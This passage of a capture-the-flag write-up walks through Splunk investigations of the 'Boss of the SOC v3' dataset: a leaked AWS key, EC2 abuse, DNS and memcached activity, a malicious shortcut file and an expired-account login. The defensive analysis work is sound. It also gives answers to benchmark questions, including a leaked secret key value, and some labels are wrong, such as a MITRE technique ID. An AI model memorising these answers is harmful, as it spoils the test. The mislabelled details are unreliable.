While reviewing the rest of the repository, i found additional information pointing to Frothly’s infrastructure.

![pic33](assets/images/botsv3/pic33.png)
_A full layout of the Frothly AWS environment was exposed_

Beside of it, a separate alert about a data leakage incident was present.

![pic34](assets/images/botsv3/pic34.png)

A file named [dump.csv](https://github.com/FrothlyBeers/BrewingIOT/blob/e4a98cc997de12bb7a59f18aea207a28bcec566c/MyDocuments/dump.csv) appears to contain a list of users whose data may have been compromised.

At this point, we’ve clearly identified the entry point of this incident: the public exposure of web_admin’s AWS credentials. From here, we can trace further steps in the adversary’s attack path and assess the impact.

**Victim**
- `web_admin` - compromised AWS user

**Malicous Contens**
- `35.153.154.221` - potentially adversary IP Address
- `209.107.196.112` - potentially adversary IP Address
- `82.102.18.111` - potentially adversary IP Address

**Tactics / Techniques**
- **Initial Access (TA0001)**
  - Valid Accounts.Cloud Accounts (T1072.004) 

> ANSWER: `Bx8/gTsYC98T0oWiFhpmdROqhELPtXJSR9vFPNGk`
{: .prompt-info }

#### Question 21 (221): Using the leaked key, the adversary makes an unauthorized attempt to create a key for a specific resource. What is the name of that resource? Answer guidance: One word.

Looking back at the initial activity logs following the leak of the `web_admin` credentials, we can observe the adversary’s first set of actions after gaining access to Frothly's AWS environment.

![pic32#2](assets/images/botsv3/pic32.png)

| @timestamp          | infected_user | suspicious_ip   | userAgent                                                        | reason                                                                                                                                             |
| ------------------- | ------------- | --------------- | ---------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------- |
| 2018-08-20 16:16:12 | web_admin     | 35.153.154.221  | Boto3/1.7.44 Python/2.7.12 Linux/4.4.0-1063-aws Botocore/1.10.44 | User: arn:aws:iam::622676721278:user/web_admin is not authorized to perform: iam:ListAccessKeys on resource: user nullweb_admin                    |
| 2018-08-20 16:16:12 | web_admin     | 35.153.154.221  | Boto3/1.7.44 Python/2.7.12 Linux/4.4.0-1063-aws Botocore/1.10.44 | User: arn:aws:iam::622676721278:user/web_admin is not authorized to perform: iam:CreateUser on resource: arn:aws:iam::622676721278:user/my_db_user |
| 2018-08-20 16:16:12 | web_admin     | 35.153.154.221  | Boto3/1.7.44 Python/2.7.12 Linux/4.4.0-1063-aws Botocore/1.10.44 | User: arn:aws:iam::622676721278:user/web_admin is not authorized to perform: iam:DeleteAccessKey on resource: user nullweb_admin                   |
| 2018-08-20 16:16:12 | web_admin     | 35.153.154.221  | Boto3/1.7.44 Python/2.7.12 Linux/4.4.0-1063-aws Botocore/1.10.44 | User: arn:aws:iam::622676721278:user/web_admin is not authorized to perform: iam:CreateAccessKey on resource: user nullweb_admin                   |
| 2018-08-20 16:16:18 | web_admin     | 209.107.196.112 | Boto3/1.6.3 Python/2.7.14 Windows/2012ServerR2 Botocore/1.9.3    | User: arn:aws:iam::622676721278:user/web_admin is not authorized to perform: iam:ListAccessKeys on resource: user nullweb_admin                    |
| 2018-08-20 16:27:07 | web_admin     | 82.102.18.111   | ElasticWolf/5.1.6                                                | User: arn:aws:iam::622676721278:user/web_admin is not authorized to perform: iam:GetUser on resource: user web_admin                               |


From these logs, it’s clear the attacker attempted to escalate privileges and create new access credentials `my_db_user`. The main target appears to be a user named `nullweb_admin`, as multiple unauthorized actions were attempted against this identity.

These failed actions suggest the adversary’s intention was to maintain access by creating a new user with fresh credentials, likely to persist in the environment undetected.

> ANSWER: `nullweb_admin`
{: .prompt-info }

#### Question 22 (222): Using the leaked key, the adversary makes an unauthorized attempt to describe an account. What is the full user agent string of the application that originated the request?

As seen in the logs from the previous question, the adversary attempted to enumerate permissions and access details using a specific client application. The final log entry reveals the use of a tool named **ElasticWolf**

>[ElasticWolf](https://github.com/Osndok/ElasticWolf) is a GUI-based client for managing AWS resources. Its usage here is significant, as it shows the adversary wasn't just running scripts, they used a management console, likely to explore, manage, or exfiltrate data manually.

![pic35](assets/images/botsv3/pic35.webp)

This unauthorized action: `iam:GetUser` was performed by `web_admin` using the ElasticWolf interface, further proving their goal of investigating existing permissions and potentially escalating privileges. This adds to the narrative that the attacker was actively trying to enumerate and abuse IAM policies and credentials.

> ANSWER: `ElasticWolf/5.1.6`
{: .prompt-info }

#### Question 23 (223): The adversary attempts to launch an Ubuntu cloud image as the compromised IAM user. What is the codename for that operating system version in the first attempt? Answer guidance: Two words.

After identifying the adversary’s initial foothold, the next logical step was to investigate what they attempted to do within the environment.

Based on our timeline and prior findings, we know the attacker used the stolen secret key to access the `web_admin` IAM user. From there, we also discovered their interest in EC2 services, so I started by crafting a query to look into the EC2-related events tied to this user.

```sql
index=botsv3 sourcetype=aws:cloudtrail 
AND userIdentity.userName=web_admin AND eventSource=ec2.amazonaws.com
AND earliest="08/20/2018:16:16:12" AND latest="08/20/2018:16:30:00"
|reverse
|stats count by eventName
```

![pic35](assets/images/botsv3/pic35.png)

The result showed 576 `RunInstances` events within just 14 minutes. That’s a major red flag, clearly someone was trying to spin up a bunch of EC2 instances in a short window, which suggests potential abuse.

To dig deeper, I focused on the compromised region (as identified earlier in the config file) and ran this:

```sql
index=botsv3 sourcetype=aws:cloudtrail 
AND eventSource=ec2.amazonaws.com AND eventName=RunInstances AND region=us-west-1
AND earliest="08/20/2018:16:16:12" AND latest="08/20/2018:16:30:00"
|reverse
|table _time userIdentity.userName src_ip requestParameters.instanceType requestParameters.instancesSet.items{}.imageId errorCode
```

![pic41](assets/images/botsv3/pic41.png)

The timestamps showed repeated attempts to launch EC2 instances using the same AMI across various instance types. This strongly indicates that the attacker was running a script to brute-force `RunInstances` calls using the `web_admin` credentials.

Interestingly, this behavior wasn’t limited to just `us-west-1`. Similar patterns showed up across multiple AWS regions, all within the same short time window and from the same `src_ip`.

Before answering the main question, I wanted to confirm whether any of these attempts actually succeeded in launching an EC2 instance:

```sql
index=botsv3 sourcetype=aws:cloudtrail 
AND eventSource=ec2.amazonaws.com AND eventName=RunInstances AND region=* AND errorCode=success
AND earliest="08/20/2018:16:16:12" 
|reverse
|table _time userIdentity.userName src_ip requestParameters.instanceType requestParameters.instancesSet.items{}.imageId errorCode
```

| _time               | userIdentity.userName | src_ip                    | requestParameters.instanceType | requestParameters.instancesSet.items{}.imageId | errorCode |
| ------------------- | --------------------- | ------------------------- | ------------------------------ | ---------------------------------------------- | --------- |
| 2018-08-20 19:55:27 |                       | autoscaling.amazonaws.com | t2.medium                      | ami-0e86606d                                   | success   |
| 2018-08-20 20:32:59 |                       | autoscaling.amazonaws.com | t2.medium                      | ami-0e86606d                                   | success   |
| 2018-08-20 20:35:02 |                       | autoscaling.amazonaws.com | t2.medium                      | ami-0e86606d                                   | success   |
| 2018-08-20 21:20:49 |                       | autoscaling.amazonaws.com | t2.medium                      | ami-0e86606d                                   | success   |
| 2018-08-20 21:22:53 |                       | autoscaling.amazonaws.com | t2.medium                      | ami-0e86606d                                   | success   |
| 2018-08-20 21:24:56 |                       | autoscaling.amazonaws.com | t2.medium                      | ami-0e86606d                                   | success   |

These successful launches were made by `autoscaling.amazonaws.com`, not `web_admin`. That suggests the adversary didn’t actually have the permissions needed to complete the deployment, they only tried to initiate it.

Now, to answer the main question: What code name of the EC2 was being used in those launch attempts?

To finding informations relate to this AMI, let's take a look at [Amazon Machine Images in Amazon EC2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/AMIs.html) 

> "An Amazon Machine Image (AMI) is an image that provides the software that is required to set up and boot an Amazon EC2 instance. Each AMI also contains a block device mapping that specifies the block devices to attach to the instances that you launch. You must specify an AMI when you launch an instance. The AMI must be compatible with the instance type that you chose for your instance. You can use an AMI provided by AWS, a public AMI, an AMI that someone else shared with you, or an AMI that you purchased from the AWS Marketplace."
{: .prompt-info}

An AMI is specific to the following:
- Region
- Operating system
- Processor architecture
- Root device type
- Virtualization type

To find out, I investigated the AMI ID ami-0e86606d using the [AWS CLI Command](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/ec2/describe-images.html#examples). This command provided all the metadata for the AMI needed for analysis.

![pic36](assets/images/botsv3/pic36.png)

```json
{
    "Images": [
        {
            "PlatformDetails": "Linux/UNIX",
            "UsageOperation": "RunInstances",
            "BlockDeviceMappings": [
                {
                    "Ebs": {
                        "DeleteOnTermination": true,
                        "SnapshotId": "snap-0a2465ce0240b73ab",
                        "VolumeSize": 8,
                        "VolumeType": "gp2",
                        "Encrypted": false
                    },
                    "DeviceName": "/dev/sda1"
                },
                {
                    "DeviceName": "/dev/sdb",
                    "VirtualName": "ephemeral0"
                },
                {
                    "DeviceName": "/dev/sdc",
                    "VirtualName": "ephemeral1"
                }
            ],
            "Description": "Canonical, Ubuntu, 16.04 LTS, amd64 xenial image build on 2018-01-09",
            "EnaSupport": true,
            "Hypervisor": "xen",
            "ImageOwnerAlias": "amazon",
            "Name": "ubuntu/images/hvm-ssd/ubuntu-xenial-16.04-amd64-server-20180109",
            "RootDeviceName": "/dev/sda1",
            "RootDeviceType": "ebs",
            "SriovNetSupport": "simple",
            "VirtualizationType": "hvm",
            "DeprecationTime": "2022-08-22T23:59:59.000Z",
            "ImageId": "ami-79aeae19",
            "ImageLocation": "amazon/ubuntu/images/hvm-ssd/ubuntu-xenial-16.04-amd64-server-20180109",
            "State": "available",
            "OwnerId": "099720109477",
            "CreationDate": "2018-01-10T04:20:44.000Z",
            "Public": true,
            "Architecture": "x86_64",
            "ImageType": "machine"
        }
    ]
}
```

From this data, we can tell the AMI used was based on Ubuntu 16.04 LTS, with the associated codename from [Ubuntu Official site](https://releases.ubuntu.com/16.04/): `Xenial Xerus`

> ANSWER: `Xenial Xerus`
{: .prompt-info }

>In this security incident, we observed several suspicious activities within Frothly's AWS environment. The adversary was able to gain a foothold through a publicly exposed secret key. However, no major damage occurred, likely due to restrictive IAM permissions assigned to the `web_admin` user.
>
>I haven’t yet investigated other sourcetypes to determine if the attacker carried out additional malicious actions within Frothly’s network. Since we’ve already identified the potential source IP addresses, I plan to continue digging deeper, but that investigation will be outside the scope of this write-up, as it requires more time and may ultimately reveal no significant impact.
{: .prompt-warning}


#### Question 24 (224): Frothly uses Amazon Route 53 for their DNS web service. What is the average length of the distinct third-level subdomains in the queries to brewertalk.com? Answer guidance: Round to two decimal places. (Example: The third-level subdomain for my.example.company.com is example.)

This question appears to relate to a separate incident, not directly connected to the previous adversary activity in the kill chain. After addressing the last two questions, I’ll include a brief summary of what we’ve uncovered so far.

To begin, I searched for the keyword `brewertalk` using `|metasearch` to get a high-level view of which sourcetypes are relevant to this investigation.

```sql
|metasearch index=botsv3 sourcetype=* brewertalk
|stats count by sourcetype
```

![pic37](assets/images/botsv3/pic37.png)

From this result, I identified the sourcetypes in use. Based on [AWS documentation](https://docs.aws.amazon.com/Route53/latest/DeveloperGuide/logging-monitoring.html), there are a few possible sources of Route 53 data, with the most common being:
- CloudTrail logs, which record API calls to `route53.amazonaws.com`
- CloudWatch logs, which can monitor Route 53 Resolver activity

An example CloudTrail log for Route 53 API usage looks like this:
```json
    "Records": [
        {
            "apiVersion": "2013-04-01",
            "awsRegion": "us-east-1",
            "eventID": "1cdbea14-e162-43bb-8853-f9f86d4739ca",
            "eventName": "ListHostedZones",
            "eventSource": "route53.amazonaws.com",
            "eventTime": "2015-01-16T00:41:48Z",
            "eventType": "AwsApiCall",
            "eventVersion": "1.02",
            "recipientAccountId": "444455556666",
            "requestID": "741e0df7-9d18-11e4-b752-f9c6311f3510",
            "requestParameters": null,
            "responseElements": null,
            "sourceIPAddress": "192.0.2.92",
            "userAgent": "Apache-HttpClient/4.3 (java 1.5)",
            "userIdentity": {
                "accessKeyId": "AKIAIOSFODNN7EXAMPLE",
                "accountId": "111122223333",
                "arn": "arn:aws:iam::111122223333:user/smithj",
                "principalId": "A1B2C3D4E5F6G7EXAMPLE",
                "type": "IAMUser",
                "userName": "smithj"
            }
        },
    ]
```

However, since `route53.amazonaws.com` didn’t show up in the available logs, I turned to CloudWatch logs. According to [AWS documentation](https://docs.aws.amazon.com/Route53/latest/DeveloperGuide/monitoring-resolver-with-cloudwatch.html), CloudWatch captures DNS queries and resolver behavior-more aligned with what we need here.

I ran a basic query to sample the logs:
```sql
index=botsv3 sourcetype=aws:cloudwatchlogs brewertalk |head 1000
```

![pic38](assets/images/botsv3/pic38.png)

These logs revealed several useful data points:
- Fully Qualified Domain Names (FQDNs)
- Source IPs
- Third-level subdomain structures

From an initial inspection, the third-level subdomains looked highly randomized, suggesting either automation or suspicious activity (e.g., domain generation algorithms or DNS tunneling).

To analyze this further, I extracted and split the domain components using the following query:

```sql
index=botsv3 sourcetype=aws:cloudwatchlogs brewertalk 
|rex "(?P<domain>(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,})"
|eval parts=split(domain, ".")
|eval tld=mvindex(parts, -1), sld=mvindex(parts, -2), third_level_subdomain=mvindex(parts, -3)
|rex "(?P<ip>\d{1,3}(?:\.\d{1,3}){3})"
|eval third_level_subdomain=if(isnull(third_level_subdomain), "", third_level_subdomain)
|dedup third_level_subdomain
|table domain third_level_subdomain ip
```
![pic39](assets/images/botsv3/pic39.png)

Before do more analysis, from extracted third-level subdomains, let's calculate their average length first.

```sql
index=botsv3 sourcetype=aws:cloudwatchlogs brewertalk 
|rex "(?P<domain>(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,})"
|eval parts=split(domain, ".")
|eval tld=mvindex(parts, -1), sld=mvindex(parts, -2), third_level_subdomain=mvindex(parts, -3)
|rex "(?P<ip>\d{1,3}(?:\.\d{1,3}){3})"
|eval third_level_subdomain=if(isnull(third_level_subdomain), "", third_level_subdomain)
|dedup third_level_subdomain
|table domain third_level_subdomain ip
|eval third_level_length=len(third_level_subdomain)
|stats avg(third_level_length) as avg_third_level_length |eval rounded_number = round(avg_third_level_length, 2)
```

![pic40](assets/images/botsv3/pic40.png)
_This aligns with the structure observed in the logs and confirms potential irregular subdomain usage targeting `brewertalk.com`_

> ANSWER: `8.1`
{: .prompt-info}

**Further Investigate**
Back to the event logs, i oberserved almost 90% of the query was NXDOMAIN, by correlate with timeline, we can see this an indicator of DNS related-attacks (e.g, DNS Hijacking, DDoS using amplified attack)

![pic42](assets/images/botsv3/pic42.png)

The earliest time i oberseved was: `2018-08-20 22:00:22` and the latest was: `2018-08-20 22:08:14`.

Look at the IP Address, a tons of requests from various IP Addresses to `brewertalk.com` in a short window time ~ 8 minutes.

![pic43](assets/images/botsv3/pic43.png)

I extracted those IP Addresses that appeared more than 1000 times in this timeline and find relevant events in other sourcetype, there were any event returned.

```sql
index=botsv3 sourcetype=stream:* OR sourcetype=aws:*
[
search index=botsv3 sourcetype=aws:cloudwatchlogs brewertalk 
|rex "(?P<ip>\d{1,3}(?:\.\d{1,3}){3})"
|stats count by ip
|where count > 1000
|rename ip as src_ip
|fields src_ip
|format
]

#Result: 0 events (event change src_ip into other fields such as dest_ip, src, ip, ...)
```

So this question might end up with DNS Hijacking or DDoS attack potentially.

#### Question 25 (225): Using the payload data found in the memcached attack, what is the name of the .jpeg file that is used by Taedonggang to deface other brewery websites? Answer guidance: Include the file extension.

This question appears to be part of a separate attack narrative, distinct from the previous activity chains (like the EC2 abuse and subdomain enumeration). I attempted to bridge the gap between **Question 224** and this one but could not identify a direct correlation in terms of kill chain or involved threat actor.

To approach this, I conducted some research on the **memcached attack vector**, since that’s the core focus of the question.

Memcached attacks are a type of amplification-based DDoS attack, exploiting exposed UDP port 11211 to reflect and amplify traffic toward a victim server. According to [Cloudflare’s write-up](https://www.cloudflare.com/learning/ddos/memcached-ddos-attack/), this attack works similarly to DNS amplification but is potentially much more powerful due to the large response sizes.


Another helpful reference is Cloudflare’s blog post titled [Memcrashed](https://blog.cloudflare.com/memcrashed-major-amplification-attacks-from-port-11211/), which documents the real-world impact of memcached DDoS incidents in 2018.

From this context, it’s possible that the group “Taedonggang” is attempting various attacks against Frothly's infrastructure, including DNS abuse (previous question) and memcached DDoS (this one). However, due to insufficient evidence, I cannot definitively link them as the same threat actor.

To identify the payload, I searched for memcached-related traffic in the dataset by filtering UDP logs on port 11211.

```sql
index=botsv3 sourcetype=stream:udp AND dest_port=11211
```
![pic44](assets/images/botsv3/pic44.png)

Among the results, I noticed some interesting entries:
- Source port 33333 stood out as unusual.
- The dest_content field contained strange, seemingly encoded or binary-like data.
- The bytes field indicated significantly large responses, consistent with amplification behavior.

To gain more insight, I explored a timeline of the events starting at `08/20/2018:22:16:17`:

```sql
index=botsv3 sourcetype=stream:udp AND app=udp
AND earliest="08/20/2018:22:16:17"
|reverse 
|table _time src_ip src_port dest_ip dest_port dest_content bytes
```
![pic45](assets/images/botsv3/pic45.png)

From here, I observed large response packets containing raw binary content in the `dest_content` field.

Upon closer inspection of the content in these packets, that was large bytes response event showed a weird content in `dest_content` field.

![pic46](assets/images/botsv3/pic46.png)

But after looking around from that evidence i haven't found anything for investigate further.

#### SERIES 200 – RECAP

> As we conclude Series 200 of the investigation, we reflect on a sequence of targeted security incidents affecting Frothly’s AWS-based infrastructure. These incidents primarily highlighted recurring themes around **cloud misconfigurations**, **credential leakage**, and **protocol abuse**.
>
> **Key Takeaways:**
> - Publicly exposed AWS S3 buckets introduced risk of remote code injection.
> - Leaked AWS IAM credentials were exploited for unauthorized access attempts.
> - Abuse of open-source and legacy protocols led to service disruption attempts.
{: .prompt-warning }

>##### **Incident 1: Misconfigured S3 Bucket Leading to Cryptojacking**
>
>The initial breach stemmed from a misconfigured S3 bucket that was inadvertently made public. Threat actors uploaded a **Coinhive cryptojacking script**, which was later injected into Frothly's production web servers through an **automated deployment pipeline**.
>
>- The same script was opened by an internal employee, **Bud Stoll**, leading to full CPU utilization on their system.
>- End-users visiting Frothly’s websites also experienced resource exhaustion due to in-browser mining.
>
>**Impact:**
>- Customer experience degraded due to 100% computer resources usage.  
>- Employee workstation compromised.  
>- Unauthorized script propagation via internal DevOps automation.
{: .prompt-info }

>##### **Incident 2: Exposed AWS Secret Key in Public Repository**
>
>In the second incident, an **AWS IAM access key** was found publicly exposed in a code repository. This allowed adversaries to gain an initial foothold into Frothly’s cloud environment.
>
>- Multiple **EC2 instance launch attempts** were detected across regions.
>- Fortunately, the compromised IAM user (`web_admin`) lacked elevated permissions.
>- No significant data loss or service interruption was reported.
>
>**Impact Mitigated By:**
>- Principle of least privilege applied to IAM configurations.  
>- No access to critical infrastructure was obtained.
{: .prompt-info }

>##### **Incident 3: Denial of Service & Memcached Abuse**
>
>The final set of incidents involved attempts to **disrupt Frothly’s online operations**:
>
>- DNS logs showed excessive queries to non-existent subdomains under `brewertalk.com`, potentially as part of a **subdomain >hijacking attempt**.
>- A separate event revealed **memcached-based UDP amplification attacks** from port `11211`, which exposed large payloads.
>- One such payload included a JPEG file hinting at **website defacement activity** by a group named **Taedonggang**.
>
>**Observations:**
>- No definitive link was established between DNS abuse and the memcached attack.  
>- Some Frothly web properties may have been defaced, but evidence remains inconclusive.
{: .prompt-info }

### Series 300

#### Question 26 (300): What is the full user agent string that uploaded the malicious link file to OneDrive?

I began this series by reviewing several questions to gain a general understanding of the investigation scope.

While **Series 200** focused heavily on **Amazon Web Services (AWS) technologies**, **Series 300** pivots toward **Microsoft cloud-based technologies**, primarily **Microsoft 365 (M365) and Azure services**. In addition to Microsoft infrastructure, the series also includes incidents involving **Linux-based attacks**.

The primary theme of this series revolves around both **user-centric** and **system-based threats**, making it a highly relevant domain for security operations analysts. However, I must acknowledge that **Boss of the SOC v2** presents a higher level of difficulty - primarily due to its emphasis on **application-layer security** and the significantly larger volume of event data to analyze.

Given that the first question relates to Microsoft Office 365, I conducted a high-level inspection of the corresponding sourcetype to better understand what telemetry we are working with.

```sql
index=botsv3 sourcetype=o365:management:activity
|fieldsummary 
|fields field values value 
|rex field=values max_match=0 "\"value\":\"(?<value>[^\"]+)\""
|fields field value
|where isnotnull(value)
```

Upon reviewing the logs, I identified several interesting artifacts. One particular field, `blindcopyto`, consistently appears with a single email address: `hyunki1984@naver.com` - This email address suggests a possible origin from Korea, based on the domain `naver.com`, a popular Korean web portal. This anomaly may indicate potential data exfiltration via BCC (Blind Carbon Copy) in email communication.

In the `ObjectId field`, we identified SharePoint-hosted, with filenames matching known artifacts from previous incidents involving Taedonggang:

```log
https://frothly-my.sharepoint.com/personal/ghoppy_froth_ly/Documents/Frothly-Shared/Yeasts/32065-pdf.pdf
https://frothly-my.sharepoint.com/personal/ghoppy_froth_ly/Documents/Frothly-Shared/Yeasts/32066-pdf.pdf
https://frothly-my.sharepoint.com/personal/ghoppy_froth_ly/Documents/Frothly-Shared/Yeasts/32136-pdf.pdf
https://frothly-my.sharepoint.com/personal/ghoppy_froth_ly/Documents/Frothly-Shared/Yeasts/32158-pdf.pdf
https://frothly-my.sharepoint.com/personal/ghoppy_froth_ly/Documents/Frothly-Shared/Yeasts/32497-pdf.pdf
https://frothly-my.sharepoint.com/personal/ghoppy_froth_ly/Documents/Frothly-Shared/Yeasts/32510-pdf.pdf
https://frothly-my.sharepoint.com/personal/ghoppy_froth_ly/Documents/Frothly-Shared/Yeasts/32624-pdf.pdf
https://frothly-my.sharepoint.com/personal/ghoppy_froth_ly/Documents/Frothly-Shared/Yeasts/32625-pdf.pdf
https://frothly-my.sharepoint.com/personal/ghoppy_froth_ly/Documents/Frothly-Shared/Yeasts/32634-pdf.pdf
```
These files correlate with historical evidence where Taedonggang exfiltrated data to an FTP server.

A field name `SearchQuery`: `cromdale OR beer OR financial OR secret`, suggests targeted reconnaissance or data theft.

Filtering for Office 365 OneDrive uploads, i identified the following suspicious event.

![pic47](assets/images/botsv3/pic47.png)

```sql
index=botsv3 sourcetype=o365:management:activity
AND vendor_product="Microsoft Office 365 OneDrive" AND action=uploaded
|reverse 
|table _time ClientIP ObjectId UserAgent UserId
```

![pic48](assets/images/botsv3/pic48.png)

In those events, `BRUCE BIRTHDAY HAPPY HOUR PICS.lnk` indicate a red flag - common technique used by adversary to lure user click on short-cut file, but it's actually run a suspicious process behind the scence.

By Googling, i found out [NaenaraBrowser](https://en.wikipedia.org/wiki/Naenara_(browser)) from user-agent `Mozilla/5.0 (X11; U; Linux i686; ko-KP; rv: 19.1br) Gecko/20130508 Fedora/1.9.1-2.5.rs3.0 NaenaraBrowser/3.5b4` was one of the browser coming from North Korea.

Took a bit further, i extracted both user-agent and malicious file and check the EDR which is Symantec datasources.

```sql
index=botsv3 sourcetype=symantec* 
AND ("Mozilla/5.0 (X11; U; Linux i686; ko-KP; rv: 19.1br) Gecko/20130508 Fedora/1.9.1-2.5.rs3.0 NaenaraBrowser/3.5b4" OR "BRUCE BIRTHDAY HAPPY HOUR PICS.lnk")
```
![pic49](assets/images/botsv3/pic49.png)

This malware is associated with remote access trojans and post-exploitation frameworks used in previous BOTS adversary campaigns.

**Victim**
- `bgist@froth.ly` - possible compromised account 

**Malicious Contents**
- `BRUCE BIRTHDAY HAPPY HOUR PICS.lnk`
- `Mozilla/5.0 (X11; U; Linux i686; ko-KP; rv: 19.1br) Gecko/20130508 Fedora/1.9.1-2.5.rs3.0 NaenaraBrowser/3.5b4`

> ANSWER: `Mozilla/5.0 (X11; U; Linux i686; ko-KP; rv: 19.1br) Gecko/20130508 Fedora/1.9.1-2.5.rs3.0 NaenaraBrowser/3.5b4`
{: .prompt-info }

#### Question 27 (301): What external client IP address is able to initiate successful logins to Frothly using an expired user account?

To tackle this question, I first tried correlating it with prior indicators, but there didn’t seem to be any direct connection between the previous events and this one. Since the relationship wasn’t clear, I decided to approach this as an independent investigation and start fresh.

I began with a basic metasearch to identify any relevant log entries related to the term `expired`:

```sql
|metasearch index=botsv3 sourcetype=ms:* expired
```

![pic50](assets/images/botsv3/pic50.png)

From this query, only one event, associated with the sourcetype `ms:aad:signin`. It included a key piece of information: **an authentication failure tied to an expired password**. The log revealed that the user `klagerfield@froth.ly` (Kevin Lagerfield) attempted to sign in and received error code 50055 with the reason: *“Invalid password, entered expired password.”*

Here's a portion of the event for context:

```json
{
  "signinErrorCode": 50055,
  "mfaAuthDetail": null,
  "appId": "00000006-0000-0ff1-ce00-000000000000",
  "correlationId": "3f2947b4-24fd-4989-9a3b-452a9f2525f1",
  "failureReason": "Invalid password, entered expired password.",
  "userId": "90aaf22f-6e60-48fb-9cca-5fbd8984225e",
  "userPrincipalName": "klagerfield@froth.ly",
  "mfaRequired": false,
  "mfaResult": null,
  "signinDateTimeInMillis": 1534765394799,
  "loginStatus": "Failure",
  "userDisplayName": "Kevin Lagerfield",
  "location": {
    "country": "CA",
    "state": "Ontario",
    "city": "Clarkson Village"
  },
  "deviceInformation": ";MacOs;Chrome 67.0.3396;",
  "dataSource": 1,
  "geoCoordinates": {
    "longitude": -79.6053237915039,
    "latitude": 43.571651458740234
  },
  "appDisplayName": "Microsoft Office 365 Portal",
  "ipAddress": "199.66.91.253",
  "id": "af845528-2298-47ba-8b52-109789240600",
  "mfaAuthMethod": null,
  "signinDateTime": "2018-08-20T11:43:14.7994359Z"
}
```
 
This log offered some valuable contexts:
- `"ipAddress"`: `"199.66.91.253"`
- `"deviceInformation"`: `";MacOs;Chrome 67.0.3396;"`
- `"location":``{"country": "CA", "state": "Ontario", "city": "Clarkson Village"}`
- `"userPrincipalName"`: `"klagerfield@froth.ly"`
- `"signinDateTime"`: `"2018-08-20T11:43:14.7994359Z"`

Still, there were not much informations that we need to conclude, i wanted to see if any successful logins were tied to the same IP. So I ran the following search to expand on activity from that source:

```sql
index=botsv3 sourcetype=ms:aad:signin 
AND ipAddress=199.66.91.253 AND earliest="08/20/2018:11:43:14"
|table userPrincipalName userDisplayName loginStatus user
|stats count by userPrincipalName userDisplayName loginStatus 
```

| userPrincipalName    | userDisplayName    | loginStatus | count |
| -------------------- | ------------------ | ----------- | ----- |
| fyodor@froth.ly      | Fyodor Malteskesko | Failure     | 2     |
| fyodor@froth.ly      | Fyodor Malteskesko | Success     | 38    |
| klagerfield@froth.ly | Kevin Lagerfield   | Failure     | 3     |
| klagerfield@froth.ly | Kevin Lagerfield   | Success     | 8     |

This IP (`199.66.91.253`) was used by both Kevin and another user, Fyodor Malteskesko. Kevin had multiple successful logins after the initial expired password attempt, which raised the question: how was he able to log in after that failure?

I pivoted to `ms:aad:audit` logs to check for any administrative actions on either of these users:

```sql
index=botsv3 sourcetype=ms:aad:audit AND (fyodor@froth.ly OR klagerfield@froth.ly)
AND (activity="Update user" OR activity="Disable account" OR activity="Change user password")
|reverse
```

One key log entry from "8/20/18 6:24:28.736 PM" confirmed that Kevin’s account had previously been disabled and was re-enabled shortly after. The modified properties in the audit trail included "AccountEnabled" set from false to true.

```json
"targets": [
    {
      "@odata.type": "#Microsoft.ActiveDirectory.DataService.PublicApi.Model.Reporting.AuditLog.TargetResourceUserEntity",
      "objectId": "90aaf22f-6e60-48fb-9cca-5fbd8984225e",
      "additionalDetails": null,
      "userSource": null,
      "isPrivileged": null,
      "ipAddress": null,
      "userPrincipalName": "klagerfield@froth.ly",
      "modifiedProperties": [
        {
          "name": "AccountEnabled",
          "oldValue": "[false]",
          "newValue": "[true]"
        },
        {
          "name": "Included Updated Properties",
          "oldValue": null,
          "newValue": "\"AccountEnabled\""
        },
        {
          "name": "TargetId.UserType",
          "oldValue": null,
          "newValue": "\"Member\""
        }
      ],
      "targetResourceType": "User",
      "name": null,
      "puid": "1003BFFDA345CB49"
    }
  ]
```

The interesting thing is, this account modification was carried out by Fyodor - `fyodor@froth.ly`:

```json
  "actor": {
    "@odata.type": "#Microsoft.ActiveDirectory.DataService.PublicApi.Model.Reporting.AuditLog.ActorUserEntity",
    "ipAddress": "<null>",
    "name": null,
    "servicePrincipalName": null,
    "objectId": "18af02a7-8541-4209-9dd5-600ab965d8a7",
    "puid": "1003BFFDA2E71FF9",
    "userPrincipalName": "fyodor@froth.ly"
  }
```

This explained why both users were logging in from the same external IP, Fyodor, likely an admin or someone with elevated privileges, had re-enabled Kevin’s account. That change allowed Kevin to authenticate successfully despite initially failing due to an expired password.

So, while the expired credential caused a failed login at first, the account status was changed, allowing further successful access from the same external IP.

> ANSWER: `199.66.91.253`
{: .prompt-info }

#### Question 28 (302): According to Symantec's website, what is the discovery date of the malware identified in the macro-enabled file? Answer guidance: Provide the US date format MM/DD/YY. (Example: January 1, 2019 should be provided as 01/01/19)
In this question, we needed to determine the discovery date of malware embedded in a macro-enabled file. Since the earlier `.lnk` file didn’t yield any additional metadata or context in Sysmon logs, I decided to start over and focus directly on identifying macro-based documents.

Macro files typically come in specific Office file types, which helped narrow the search. Here's a quick reference of macro-enabled formats:


| Office App           | File Type                  | Extension                                  |
| -------------------- | -------------------------- | ------------------------------------------ |
| Microsoft Word       | Macro-enabled document     | `.docm`                                    |
| Microsoft Excel      | Macro-enabled workbook     | `.xlsm`                                    |
| Microsoft PowerPoint | Macro-enabled presentation | `.pptm`                                    |
| Microsoft Access     | Macro-enabled database     | `.accdb` (macros in VBA modules) or `.mdb` |
| Project / Visio      | May support VBA macros     | `.mpp`, `.vsdm` (Visio macro-enabled)      |

Using those extensions, I performed the following Splunk search

```sql
index=botsv3 
AND (sourcetype=ms:* OR sourcetype=*win* OR sourcetype=stream:* OR sourcetype=symantec:*)
AND (*.docm OR *.xlsm OR *.pptm OR *.accdb OR *.mdb OR *.mpp OR *.vsdm)
|reverse
```

Five results came back, and the earliest was from Sysmon logs tied to the user `BruceGist`. The process `HxTsr.exe` (related to Microsoft Outlook) accessed a suspicious file named `Frothly-Brewery-Financial-Planning-FY2019-Draft[66].xlsm`.

**Indexed Time**: 8/20/18 4:55:52 PM

**System Time**: 2018-08-20T09:55:52.449Z

```xml
<Event
	xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>
	<System>
		<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/>
		<EventID>11</EventID>
		<Version>2</Version>
		<Level>4</Level>
		<Task>11</Task>
